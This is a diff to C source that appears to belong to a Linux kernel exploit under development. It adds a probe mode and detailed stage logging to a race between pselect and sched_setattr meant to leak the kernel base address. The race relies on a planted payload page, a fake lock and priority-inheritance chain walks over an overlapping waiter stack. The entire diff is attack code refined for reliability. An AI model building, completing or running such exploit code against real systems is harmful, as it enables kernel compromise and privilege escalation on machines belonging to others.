@@ -20,6 +20,7 @@ static atomic_int slide_consume_go;
 static atomic_int slide_consume_stop;
 static atomic_int slide_consume_sched_ok;
 static atomic_int slide_consume_calls;
+static atomic_int slide_probe_mode;
 
 static int slide_word_shift;
 
@@ -224,10 +225,13 @@ void slide_pselect_stack_copy(void) {
   int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
   int saved_errno = errno;
   atomic_store(&slide_consume_go, 0);
-  pr_info("slide pselect RETURNED ret=%d errno=%d shift=%d sched_ok=%d calls=%d\n",
+  pr_info("slide pselect RETURNED ret=%d errno=%d shift=%d probe=%d sched_ok=%d calls=%d\n",
           ret, saved_errno, slide_word_shift,
+          atomic_load(&slide_probe_mode),
           atomic_load(&slide_consume_sched_ok),
           atomic_load(&slide_consume_calls));
+  pr_info("slide pselect comparing fd_sets vs planted payload "
+          "(diffs = kernel wrote back into the waiter stack region)\n");
   slide_dump_fdsets(&in, &out, &ex,
                     slide_pselect_words_per_set(), "post-pselect");
   fflush(stdout);
@@ -268,26 +272,43 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
     int tid = atomic_load(&slide_waiter_tid);
     int calls = atomic_load(&slide_consume_calls);
     atomic_store(&slide_consume_calls, calls + 1);
-    pr_info("slide consumer issuing sched_setattr call#%d tid=%d (rt prio 50, panic point if crash follows)\n",
+    if (atomic_load(&slide_probe_mode)) {
+      pr_info("slide consumer PROBE round call#%d tid=%d: skipping sched_setattr "
+              "(safe probe; pselect must return without PI chain walk)\n",
+              calls + 1, tid);
+      fflush(stdout);
+      atomic_store(&slide_consume_stop, 1);
+      while (atomic_load(&slide_consume_go)) {
+        __asm__ volatile("yield" ::: "memory");
+      }
+      return NULL;
+    }
+    pr_info("slide consumer call#%d tid=%d stage=RT-ENTER sched_setattr SCHED_FIFO prio=50\n",
             calls + 1, tid);
     fflush(stdout);
     errno = 0;
-    /* EXPERIMENT: use SCHED_FIFO+RT priority instead of SCHED_BATCH+nice to
-     * test whether an RT priority change is what triggers
-     * rt_mutex_adjust_prio_chain on shennong 6.1. Falls back to nice on EPERM. */
     long ret = sched_setattr_tid_rt(tid, 50);
     int call_errno = errno;
+    pr_info("slide consumer call#%d stage=RT-DONE ret=%ld errno=%d (EPERM=1 means no PI walk on this call)\n",
+            calls + 1, ret, call_errno);
+    fflush(stdout);
     if (ret != 0 && call_errno == 1) { /* EPERM */
+      pr_info("slide consumer call#%d stage=NICE-ENTER sched_setattr nice=%d (this DOES trigger rt_mutex_setprio -> adjust_prio_chain)\n",
+              calls + 1, PSELECT_CONSUMER_NICE);
+      fflush(stdout);
       errno = 0;
       ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
       call_errno = errno;
+      pr_info("slide consumer call#%d stage=NICE-DONE ret=%ld errno=%d\n",
+              calls + 1, ret, call_errno);
+      fflush(stdout);
     }
     if (ret == 0) {
       atomic_fetch_add(&slide_consume_sched_ok, 1);
     }
-    pr_info("slide consumer sched tid=%d ret=%ld errno=%d sched_ok=%d (rt50 fallback nice=%d)\n",
-            tid, ret, call_errno, atomic_load(&slide_consume_sched_ok),
-            PSELECT_CONSUMER_NICE);
+    pr_info("slide consumer sched tid=%d ret=%ld errno=%d sched_ok=%d\n",
+            tid, ret, call_errno, atomic_load(&slide_consume_sched_ok));
+    fflush(stdout);
 
     atomic_store(&slide_consume_stop, 1);
     while (atomic_load(&slide_consume_go)) {
@@ -555,10 +576,19 @@ int slide_leak_kernel_base(void) {
   int shifts[] = {3, 0, 1, 2, -1, -2};
   int n_shifts = sizeof(shifts) / sizeof(shifts[0]);
 
+  /* attempt 1 = safe probe: consumer never calls sched_setattr, so the PI
+   * chain walk never runs. If pselect still panics there, the waiter overlap
+   * itself (fd_set copy-in) is the killer, not the PI walk. */
+  int probe_first = (fixed_shift == -100);
+
   for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
     slide_word_shift = (fixed_shift != -100)
                            ? fixed_shift
                            : shifts[(attempt - 1) % n_shifts];
+    atomic_store(&slide_probe_mode, probe_first && attempt == 1);
+    if (atomic_load(&slide_probe_mode)) {
+      pr_info("slide attempt 1 PROBE MODE: sched_setattr disabled, expect clean pselect return + fd_set write-back dump\n");
+    }
 
     page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
     if (!page_base || !fake_lock) {
